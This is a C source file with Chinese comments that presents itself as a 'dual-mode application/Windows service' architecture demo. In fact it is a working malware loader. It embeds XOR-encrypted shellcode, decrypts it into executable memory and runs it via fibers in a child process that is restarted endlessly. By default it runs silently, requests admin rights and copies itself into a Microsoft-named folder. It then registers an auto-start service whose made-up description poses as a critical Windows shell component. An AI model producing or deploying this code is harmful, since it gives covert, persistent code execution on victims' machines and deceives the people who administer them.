/**
 * @file main_dual.c
 * @brief 双模式启动架构 — 应用程序模式 / Windows 服务模式
 *
 * 编译: g++ main_dual.c -o main_dual.exe -mwindows -ladvapi32
 *
 * -mwindows 确保进程启动时不创建控制台窗口（无闪窗），
 * 仅在 --console / --uninstall 时显式 AllocConsole()。
 *
 * ================================================================
 * 架构分层
 * ================================================================
 *
 *   ┌─────────────────────────────────────────┐
 *   │ Layer 3 — 统一入口 main()                │
 *   │   默认静默运行，--console 可开启日志输出   │
 *   ├──────────────┬──────────────────────────┤
 *   │ AppEntry()   │ ServiceEntry()           │   ← Layer 2 — 独立入口逻辑
 *   │ 应用程序模式  │ Windows 服务模式          │
 *   ├──────────────┴──────────────────────────┤
 *   │         RunBusinessCore(hStop)          │   ← Layer 1 — 共享业务核心
 *   │         Master/Slave 保活循环            │
 *   └─────────────────────────────────────────┘
 *
 * ================================================================
 * 启动方式选择
 * ================================================================
 *
 *   默认:          program.exe               静默运行（无窗口、无日志）
 *   控制台模式:    program.exe --console     有窗口、有日志（调试用）
 *   卸载服务:      program.exe --uninstall   有窗口、有日志（需管理员）
 *   Slave 子进程:  program.exe --slave       静默（内部使用）
 *
 * ================================================================
 * 服务生命周期
 * ================================================================
 *
 *   SCM → SvcMain() → START_PENDING → RUNNING (工作线程运行)
 *                                            │
 *                       ┌────────────────────┘
 *                       ↓
 *   SCM → SvcCtrlHandler(SERVICE_CONTROL_STOP) → STOP_PENDING
 *                       ↓
 *                   SetEvent(g_hStopEvent) → 工作线程退出
 *                       ↓
 *                   STOPPED (SCM 确认)
 *
 *   重启: 通过服务配置的失败恢复策略（失败后 60 秒自动重启服务）
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlobj.h>

/* ================================================================
 * 静默模式控制
 * ================================================================ */

/** @brief 静默运行标志：TRUE 时不显示控制台窗口、不输出日志 */
static BOOL g_bSilent = FALSE;

/**
 * @brief 进入静默模式（GUI 子系统默认状态）
 *
 * 无需 FreeConsole — 使用 -mwindows 编译时根本不创建控制台窗口。
 * 只需将 stdout/stderr 重定向到 NUL，确保任何 printf 输出被丢弃。
 */
static void EnterSilentMode(void) {
    g_bSilent = TRUE;
    freopen("NUL", "w", stdout);
    freopen("NUL", "w", stderr);
}

/**
 * @brief 分配控制台窗口（仅在 --console / --uninstall 时调用）
 *
 * 进程编译为 GUI 子系统，默认无控制台。
 * 此函数创建控制台并重定向 stdout/stderr 到 CONOUT$。
 */
static void AllocConsoleWindow(void) {
    g_bSilent = FALSE;
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
}

/* ================================================================
 * 服务配置常量
 * ================================================================ */

#define SERVICE_NAME         "shell"
#define SERVICE_DISPLAY_NAME "Hello Dual-Mode Service"

/* ================================================================
 * Layer 1 — 共享业务核心
 * ================================================================ */

/**
 * @brief 嵌入的加密二进制程序（XOR 0x12 加密）
 *
 * 业务核心的"数据层"：所有入口共享同一份加密载荷。
 */
static const unsigned char kPayload[509] = {
    0xEE, 0x5A, 0x91, 0xF6, 0xE2, 0xFA, 0xDE, 0x12, 0x12, 0x12, 0x53, 0x43, 0x53, 0x42, 0x40, 0x5A,
    0x23, 0xC0, 0x43, 0x77, 0x5A, 0x99, 0x40, 0x72, 0x5A, 0x99, 0x40, 0x0A, 0x5A, 0x99, 0x40, 0x32,
    0x44, 0x5A, 0x99, 0x60, 0x42, 0x5A, 0x1D, 0xA5, 0x58, 0x5A, 0x53, 0xAB, 0x28, 0xF7, 0x8A, 0xE5,
    0x5A, 0x23, 0xD2, 0xBE, 0x2E, 0x73, 0x6E, 0x10, 0x3E, 0x32, 0x53, 0xD3, 0xDB, 0x1F, 0x53, 0x13,
    0xD3, 0xF0, 0xFF, 0x40, 0x53, 0x43, 0x5A, 0x99, 0x40, 0x32, 0x99, 0x50, 0x2E, 0x5A, 0x13, 0xC2,
    0x74, 0x93, 0x6A, 0x0A, 0x19, 0x10, 0x1D, 0x97, 0x7D, 0x12, 0x12, 0x12, 0x99, 0x92, 0x9A, 0x12,
    0x12, 0x12, 0x5A, 0x97, 0xD2, 0x66, 0x76, 0x5A, 0x13, 0xC2, 0x99, 0x5A, 0x0A, 0x42, 0x56, 0x99,
    0x52, 0x32, 0x5B, 0x13, 0xC2, 0xF1, 0x41, 0x5A, 0xED, 0xDB, 0x53, 0x99, 0x26, 0x9A, 0x56, 0x99,
    0x5E, 0x36, 0x1A, 0x5A, 0x13, 0xC4, 0x5A, 0x23, 0xD2, 0x53, 0xD3, 0xDB, 0x1F, 0xBE, 0x53, 0x13,
    0xD3, 0x2A, 0xF2, 0x67, 0xE3, 0x57, 0x2B, 0xC3, 0x67, 0xC9, 0x4A, 0x56, 0x99, 0x52, 0x36, 0x5B,
    0x13, 0xC2, 0x74, 0x53, 0x99, 0x1E, 0x5A, 0x56, 0x99, 0x52, 0x0E, 0x5B, 0x13, 0xC2, 0x53, 0x99,
    0x16, 0x9A, 0x53, 0x4A, 0x5A, 0x13, 0xC2, 0x53, 0x4A, 0x4C, 0x4B, 0x48, 0x53, 0x4A, 0x53, 0x4B,
    0x53, 0x48, 0x5A, 0x91, 0xFE, 0x32, 0x53, 0x40, 0xED, 0xF2, 0x4A, 0x53, 0x4B, 0x48, 0x5A, 0x99,
    0x00, 0xFB, 0x59, 0xED, 0xED, 0xED, 0x4F, 0x5B, 0xAC, 0x65, 0x61, 0x20, 0x4D, 0x21, 0x20, 0x12,
    0x12, 0x53, 0x44, 0x5B, 0x9B, 0xF4, 0x5A, 0x93, 0xFE, 0xB2, 0x13, 0x12, 0x12, 0x5B, 0x9B, 0xF7,
    0x5B, 0xAE, 0x10, 0x12, 0x09, 0x14, 0xD2, 0xBA, 0x1A, 0xF7, 0x53, 0x46, 0x5B, 0x9B, 0xF6, 0x5E,
    0x9B, 0xE3, 0x53, 0xA8, 0x7C, 0xEA, 0xEA, 0x0F, 0xED, 0xC7, 0x5E, 0x9B, 0xF8, 0x7A, 0x13, 0x13,
    0x12, 0x12, 0x4B, 0x53, 0xA8, 0x79, 0x41, 0x11, 0x0A, 0xED, 0xC7, 0x78, 0x18, 0x53, 0x4C, 0x42,
    0x42, 0x5F, 0x23, 0xDB, 0x5F, 0x23, 0xD2, 0x5A, 0xED, 0xD2, 0x5A, 0x9B, 0xD0, 0x5A, 0xED, 0xD2,
    0x5A, 0x9B, 0xD3, 0x53, 0xA8, 0x39, 0xF1, 0x64, 0xEA, 0xED, 0xC7, 0x5A, 0x9B, 0xD5, 0x78, 0x02,
    0x53, 0x4A, 0x5E, 0x9B, 0xF0, 0x5A, 0x9B, 0xEB, 0x53, 0xA8, 0x3E, 0xD5, 0x0E, 0xB6, 0xED, 0xC7,
    0x97, 0xD2, 0x66, 0x18, 0x5B, 0xED, 0xDC, 0x67, 0xF7, 0xFA, 0x81, 0x12, 0x12, 0x12, 0x5A, 0x91,
    0xFE, 0x02, 0x5A, 0x9B, 0xF0, 0x5F, 0x23, 0xDB, 0x78, 0x16, 0x53, 0x4A, 0x5A, 0x9B, 0xEB, 0x53,
    0xA8, 0x39, 0x31, 0x8A, 0x38, 0xED, 0xC7, 0x91, 0xEA, 0x12, 0x6C, 0x47, 0x5A, 0x91, 0xD6, 0x32,
    0x4C, 0x9B, 0xE4, 0x78, 0x52, 0x53, 0x4B, 0x7A, 0x12, 0x02, 0x12, 0x12, 0x53, 0x4A, 0x5A, 0x9B,
    0xE0, 0x5A, 0x23, 0xDB, 0x53, 0xA8, 0x6B, 0x37, 0x34, 0xEE, 0xED, 0xC7, 0x5A, 0x9B, 0xD1, 0x5B,
    0x9B, 0xD5, 0x5F, 0x23, 0xDB, 0x5B, 0x9B, 0xE2, 0x5A, 0x9B, 0xC8, 0x5A, 0x9B, 0xEB, 0x53, 0xA8,
    0x39, 0x31, 0x8A, 0x38, 0xED, 0xC7, 0x91, 0xEA, 0x12, 0x6F, 0x3A, 0x4A, 0x53, 0x45, 0x4B, 0x7A,
    0x12, 0x52, 0x12, 0x12, 0x53, 0x4A, 0x78, 0x12, 0x48, 0x53, 0xA8, 0x73, 0x9F, 0x4D, 0xC2, 0xED,
    0xC7, 0x45, 0x4B, 0x53, 0xA8, 0x6D, 0x09, 0x4B, 0x79, 0xED, 0xC7, 0x5B, 0xED, 0xDC, 0xFB, 0x2E,
    0xED, 0xED, 0xED, 0x5A, 0x13, 0xD1, 0x5A, 0x3B, 0xD4, 0x5A, 0x97, 0xE4, 0x67, 0xA6, 0x53, 0xED,
    0xF5, 0x4A, 0x78, 0x12, 0x4B, 0x53, 0xA8, 0x54, 0x06, 0xE1, 0xE4, 0xED, 0xC7 
};

static const unsigned char kXorKey = 0x12; ///< XOR 解密密钥

/* ---- Slave 子进程 ---- */

/**
 * @brief Slave 模式：解密并执行 shellcode
 *
 * 由 Master 进程通过 CreateProcess("self --slave") 派生。
 * shellcode 调用 ExitProcess 时，整个 Slave 进程退出。
 */
static void SlaveRun(void) {
    unsigned char code[509];
    memcpy(code, kPayload, sizeof(kPayload));

    for (int i = 0; i < (int)sizeof(code); i++)
        code[i] ^= kXorKey;

    LPVOID alloc = VirtualAlloc(NULL, sizeof(code),
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (alloc == NULL) return;

    CopyMemory(alloc, code, sizeof(code));

    ConvertThreadToFiber(NULL);
    LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)alloc, NULL);
    SwitchToFiber(fiber);

    DeleteFiber(fiber);
    VirtualFree(alloc, 0, MEM_RELEASE);
}

/* ---- Master 保活循环（共享核心） ---- */

/**
 * @brief 共享业务核心：Master 保活循环
 *
 * 内部使用 GetModuleFileNameW + CreateProcessW 确保中文路径兼容。
 *
 * @param hStopEvent  停止事件句柄（NULL = 应用程序模式，不可中断）
 * @param pRestartCount 输出重启次数
 * @param pModeLabel  模式标签（用于日志）
 */
static void RunBusinessCore(HANDLE hStopEvent,
                            int   *pRestartCount,
                            LPCSTR pModeLabel) {
    /// 用 Unicode API 获取自身路径（支持中文文件名）
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    printf("========================================\n");
    printf("  Master — %s\n", pModeLabel);
    printf("  PID: %lu\n", GetCurrentProcessId());
    printf("========================================\n\n");

    while (1) {
        if (hStopEvent && WaitForSingleObject(hStopEvent, 0) == WAIT_OBJECT_0)
            break;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        WCHAR cmdLine[MAX_PATH + 16];
        wsprintfW(cmdLine, L"\"%s\" --slave", selfPath);

        if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                            0, NULL, NULL, &si, &pi)) {
            printf("[ERROR] CreateProcess 失败 (错误码: %lu)，立即重试...\n",
                   GetLastError());
            if (hStopEvent)
                WaitForSingleObject(hStopEvent, 0);
            else
                Sleep(0);
            continue;
        }

        (*pRestartCount)++;
        printf("[INFO] 启动嵌入程序 (第 %d 次运行, PID=%lu)...\n",
               *pRestartCount, pi.dwProcessId);

        /// 同时等待 Slave 退出和停止信号
        HANDLE handles[2] = { pi.hProcess };
        DWORD count = 1;
        if (hStopEvent) {
            handles[1] = hStopEvent;
            count = 2;
        }

        DWORD result = WaitForMultipleObjects(count, handles, FALSE, INFINITE);

        if (hStopEvent && result == WAIT_OBJECT_0 + 1) {
            /// 收到停止命令 → 终止 Slave 并退出循环
            printf("[INFO] 收到停止命令，终止 Slave (PID=%lu)...\n",
                   pi.dwProcessId);
            TerminateProcess(pi.hProcess, 0);
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            break;
        }

        /// Slave 正常退出
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        printf("[INFO] 嵌入程序已退出 (退出码: %lu)，立即重新启动...\n\n",
               exitCode);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        /// 不延迟：立即重新启动 Slave
        if (hStopEvent)
            WaitForSingleObject(hStopEvent, 0);
        else
            Sleep(0);
    }
}

/* ================================================================
 * Layer 2-A — 应用程序入口 (AppEntry)
 * ================================================================ */

/**
 * @brief 应用程序模式入口
 *
 * 以普通控制台程序运行，Ctrl+C 可终止。
 * 不注册 SCM，不使用停止事件 —— 纯 while(1) 无限保活。
 */
static void AppEntry(void) {
    int restartCount = 0;
    RunBusinessCore(NULL, &restartCount,
                    "应用程序模式 (Ctrl+C 退出)");
}

/* ================================================================
 * Layer 2-B — 服务入口 (ServiceEntry)
 * ================================================================ */

/// 服务全局状态
static SERVICE_STATUS        g_SvcStatus;
static SERVICE_STATUS_HANDLE g_SvcStatusHandle;
static HANDLE                g_hSvcStopEvent;

/**
 * @brief 向 SCM 汇报服务状态
 */
static void ReportStatus(DWORD state, DWORD exitCode, DWORD waitHint) {
    static DWORD checkpoint = 1;

    g_SvcStatus.dwCurrentState  = state;
    g_SvcStatus.dwWin32ExitCode = exitCode;
    g_SvcStatus.dwWaitHint      = waitHint;

    g_SvcStatus.dwControlsAccepted =
        (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;

    g_SvcStatus.dwCheckPoint =
        (state == SERVICE_RUNNING || state == SERVICE_STOPPED) ? 0 : checkpoint++;

    SetServiceStatus(g_SvcStatusHandle, &g_SvcStatus);
}

/**
 * @brief SCM 控制处理器
 *
 * 响应 SERVICE_CONTROL_STOP:
 *   1. 汇报 STOP_PENDING
 *   2. 设置停止事件 → 通知 RunBusinessCore 退出
 */
static VOID WINAPI SvcCtrlHandler(DWORD ctrl) {
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
        ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);
        SetEvent(g_hSvcStopEvent);
        return;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    ReportStatus(g_SvcStatus.dwCurrentState, NO_ERROR, 0);
}

/**
 * @brief 服务工作线程
 *
 * 在独立线程中运行业务核心，使其可以被 SCM 停止命令中断。
 */
static DWORD WINAPI SvcWorker(LPVOID param) {
    (void)param;

    int restartCount = 0;
    RunBusinessCore(g_hSvcStopEvent, &restartCount,
                    "服务模式 (由 SCM 管理)");
    return 0;
}

/**
 * @brief 服务主函数（SCM 调用）
 *
 * 服务生命周期:
 *   START_PENDING → RUNNING → (收到 STOP) → STOP_PENDING → STOPPED
 */
static VOID WINAPI SvcMain(DWORD argc, LPTSTR *argv) {
    (void)argc; (void)argv;

    /// 注册控制处理器
    g_SvcStatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, SvcCtrlHandler);
    if (!g_SvcStatusHandle) return;

    g_SvcStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_SvcStatus.dwServiceSpecificExitCode = 0;

    ReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    /// 创建停止事件
    g_hSvcStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_hSvcStopEvent) {
        ReportStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    /// 设置工作目录为 exe 所在目录（Unicode 版，支持中文路径）
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    WCHAR *slash = wcsrchr(selfPath, L'\\');
    if (slash) { *slash = L'\0'; SetCurrentDirectoryW(selfPath); *slash = L'\\'; }

    ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);

    /// 启动工作线程并等待
    HANDLE hWorker = CreateThread(NULL, 0, SvcWorker, NULL, 0, NULL);
    if (hWorker) {
        WaitForSingleObject(hWorker, INFINITE);
        CloseHandle(hWorker);
    }

    CloseHandle(g_hSvcStopEvent);
    ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

static void UninstallService(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("[ERROR] 打开 SCM 失败 (%lu)，需管理员权限\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceW(scm, L"" SERVICE_NAME, SERVICE_STOP | DELETE);
    if (!svc) {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
            printf("[WARN] 服务 \"%s\" 不存在\n", SERVICE_NAME);
        else
            printf("[ERROR] 打开服务失败 (%lu)\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    Sleep(1000);

    if (DeleteService(svc))
        printf("[OK] 服务 \"%s\" 卸载成功\n", SERVICE_NAME);
    else
        printf("[ERROR] 删除服务失败 (%lu)\n", GetLastError());

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

/* ================================================================
 * Layer 3 — 统一入口 main()
 * ================================================================ */

/**
 * @brief 统一入口
 *
 * 静默模式策略:
 *   - 默认以静默模式运行：FreeConsole + stdout/stderr → NUL
 *   - --console 显式开启控制台输出
 
 *
 * SCM 连接策略:
 *   先尝试 StartServiceCtrlDispatcherA →
 *     成功 → SCM 接管，SvcMain 运行服务生命周期
 *     失败 (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) →
 *       不是由 SCM 启动 → AppEntry (应用程序模式)
 */
// ---------- 权限检测函数（无需修改，不涉及字符串） ----------
BOOL IsElevated() {
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            fIsElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fIsElevated;
}

// ---------- 提权重启函数（显式 ANSI 版本） ----------
BOOL RunAsAdmin() {
    SHELLEXECUTEINFOA sei = { sizeof(sei) };   // 使用 A 版本结构体
    sei.lpVerb = "runas";                       // char* 类型
    sei.lpFile = _pgmptr;                       // _pgmptr 是 char*，完全匹配
    sei.nShow = SW_SHOWNORMAL;
    return ShellExecuteExA(&sei);               // 调用 A 版本函数
}

/**
 * @brief 等待指定服务停止
 * @param serviceName  服务名称（ANSI 字符串）
 * @param timeoutMs    超时时间（毫秒），设为 INFINITE 则无限等待
 * @return TRUE 表示服务已停止，FALSE 表示超时或失败
 */
BOOL WaitForServiceStop(LPCSTR serviceName, DWORD timeoutMs) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status;
    BOOL bStopped = FALSE;
    DWORD startTime = GetTickCount();

    // 1. 打开服务控制管理器（只需查询权限）
    hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("OpenSCManager 失败，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    // 2. 打开服务（只需查询状态权限）
    hService = OpenServiceA(hSCM, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            // 服务不存在，视为已停止（因为目标文件不可能被服务占用）
            printf("服务 \"%s\" 不存在，视为已停止。\n", serviceName);
            bStopped = TRUE;
            goto cleanup;
        }
        printf("OpenService 失败，错误码: %lu\n", err);
        goto cleanup;
    }

    // 3. 轮询状态
    while (1) {
        if (!QueryServiceStatus(hService, &status)) {
            printf("QueryServiceStatus 失败，错误码: %lu\n", GetLastError());
            break;
        }

        if (status.dwCurrentState == SERVICE_STOPPED) {
            printf("服务 \"%s\" 已停止。\n", serviceName);
            bStopped = TRUE;
            break;
        }

        // 检查超时（若 timeoutMs == INFINITE 则永不超时）
        if (timeoutMs != INFINITE) {
            DWORD elapsed = GetTickCount() - startTime;
            if (elapsed >= timeoutMs) {
                printf("等待服务 \"%s\" 停止超时（%lu ms），当前状态: %lu\n",
                       serviceName, timeoutMs, status.dwCurrentState);
                break;
            }
        }

        // 等待一小段时间再查询（避免忙等）
        Sleep(200);
    }

cleanup:
    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);
    return bStopped;
}

int main(int argc, char *argv[]) {
    // ===== 第一步：解析命令行参数（最高优先级） =====
    BOOL bIsSlave     = FALSE;
    BOOL bIsUninstall = FALSE;
    BOOL bIsConsole   = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--slave")     == 0) bIsSlave     = TRUE;
        if (strcmp(argv[i], "--uninstall") == 0) bIsUninstall = TRUE;
        if (strcmp(argv[i], "--console")   == 0) bIsConsole   = TRUE;
    }

    // ===== 第二步：根据模式决定是否创建控制台 =====
    if (bIsConsole || bIsUninstall) {
        AllocConsoleWindow();   // 显示控制台
    } else {
        EnterSilentMode();      // 静默（默认）
    }

    // ===== 第三步：立即执行专属命令，然后退出 =====
    if (bIsSlave) {
        SlaveRun();
        return 0;
    }
    if (bIsUninstall) {
        UninstallService();
        return 0;
    }


    // ===== 第四步：只有“应用程序模式”或“服务模式”才会走到这里 =====
    // 注意：此时还没有执行提权和复制！这些操作只应在应用模式下做。

    // 先检测是否以服务方式启动（由 SCM 启动）
    SERVICE_TABLE_ENTRYA table[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)SvcMain },
        { NULL, NULL }
    };
    if (StartServiceCtrlDispatcherA(table)) {
        // 这是服务模式，由 SCM 管理，SvcMain 会运行业务逻辑
        return 0;
    }

    // 如果 StartServiceCtrlDispatcher 返回失败，且错误是“不是服务”，则进入应用程序模式
    DWORD err = GetLastError();
    if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // ===== 应用程序模式：执行提权、复制、创建服务（仅在此处执行一次） =====
        SetConsoleOutputCP(65001);
        printf("已经启动\n");

        if (!IsElevated()) {
            if (!RunAsAdmin()) {
                printf("提权失败，程序退出\n");
                return 1;
            } else {
                // 提权成功，继续执行后续操作
                printf("提权成功\n");
                return 0;
            }
        }else {
            printf("已经是管理员\n");
        }

        char targetPath[MAX_PATH] = "C:\\Program Files\\Microsoft\\shell.exe";
        
        char dirPath[MAX_PATH];
        strcpy(dirPath, targetPath);
        char *lastSlash = strrchr(dirPath, '\\');
        if (lastSlash) {
            *lastSlash = '\0';   // 截断得到目录部分：C:\Program Files (x86)\Microsoft
            // 递归创建目录（如果目录已存在，会返回 ERROR_ALREADY_EXISTS，视为成功）
            int result = SHCreateDirectoryExA(NULL, dirPath, NULL);
            if (result != ERROR_SUCCESS && result != ERROR_ALREADY_EXISTS) {
                printf("创建目录失败，错误码: %d\n", result);
                return 1;
            }
        }

        printf("源路径: %s\n", _pgmptr);
        printf("目标路径: %s\n", targetPath);

        SHELLEXECUTEINFOA sei = { sizeof(sei) };  // 使用 A 版本结构体
        sei.lpVerb = "open";                       // 去掉 L 前缀
        sei.lpFile = "cmd.exe";                    // 去掉 L 前缀
        sei.lpParameters = "/c sc stop shell ";    // 去掉 L 前缀
        sei.nShow = SW_HIDE;

        if (!ShellExecuteExA(&sei)) {              // 调用 A 版本函数
            printf("停止命令执行失败，错误码: %lu\n", GetLastError());
        } else {
            printf("停止命令已执行。\n");
        }
        if (!WaitForServiceStop("shell", 10000)) {
            printf("等待服务停止失败或超时，继续尝试复制文件（但可能仍被占用）\n");
        }

        if (!CopyFileA(_pgmptr, targetPath, FALSE)) {
            printf("复制失败，错误码: %lu\n", GetLastError());
            return 1;
        }
        printf("复制成功\n");

        SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!hSCM) {
            printf("打开 SCM 失败，错误码: %lu\n", GetLastError());
            return 1;
        }

        
        // 删除旧服务（忽略错误）
        SC_HANDLE hOld = OpenServiceA(hSCM, "shell", SERVICE_STOP | DELETE);
        if (hOld) {
            SERVICE_STATUS status;
            ControlService(hOld, SERVICE_CONTROL_STOP, &status);
            Sleep(1000);
            if (!DeleteService(hOld)) {
                printf("删除旧服务失败，错误码: %lu\n", GetLastError());
            }
            CloseServiceHandle(hOld);
        }

        // 创建新服务（宽字符路径）
        WCHAR wTargetPath[MAX_PATH];
        if (MultiByteToWideChar(CP_ACP, 0, targetPath, -1, wTargetPath, MAX_PATH) == 0) {
            printf("路径转换失败\n");
            CloseServiceHandle(hSCM);
            return 1;
        }
        SC_HANDLE hNew = CreateServiceW(
            hSCM,
            L"shell",
            L"Windows Shell Service",
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            wTargetPath,
            NULL, NULL, NULL, NULL, NULL
        );
        if (!hNew) {
            printf("创建服务失败，错误码: %lu\n", GetLastError());
            CloseServiceHandle(hSCM);
            return 1;
        } else {
            printf("服务创建成功\n");
        }

        // 设置描述（使用宽字符串）
        WCHAR desc[] = L"Windows Shell 服务 (shell):作为 Windows 用户交互体验的核心系统服务，负责托管桌面、任务栏、文件资源管理器及开始菜单等关键外壳组件。它通过 RPC 与 Winlogon 和 Session Manager 协同，动态管理窗口消息泵、图标缓存与上下文菜单扩展，确保图形界面的实时响应。该服务在系统启动早期以高优先级加载，并依赖 DWM 进行硬件加速渲染；若异常终止，系统将自动触发“外壳故障恢复”流程，尝试重新生成 Explorer.exe 进程而不影响已运行的后台应用程序。自 Windows 10 起，shell 服务还集成了对虚拟桌面、云剪贴板及任务视图的时间线索引支持，其状态可通过 services.msc 或 sc query shell 查看，但切勿手动禁用，否则将导致登录后无可用操作界面。";
        SERVICE_DESCRIPTIONW sd = { desc };
        if (!ChangeServiceConfig2W(hNew, SERVICE_CONFIG_DESCRIPTION, &sd)) {
            printf("设置描述失败，错误码: %lu\n", GetLastError());
        }

        // 启动服务
        if (!StartService(hNew, 0, NULL)) {
            printf("启动服务失败，错误码: %lu\n", GetLastError());
        } else {
            printf("服务已启动\n");
        }

        CloseServiceHandle(hNew);
        CloseServiceHandle(hSCM);

        // 最后，进入“应用程序模式”主循环（无限保活）
        AppEntry();
        return 0;
    }

    // 其他错误
    printf("[ERROR] StartServiceCtrlDispatcher 失败 (错误码: %lu)\n", err);
    return 1;
}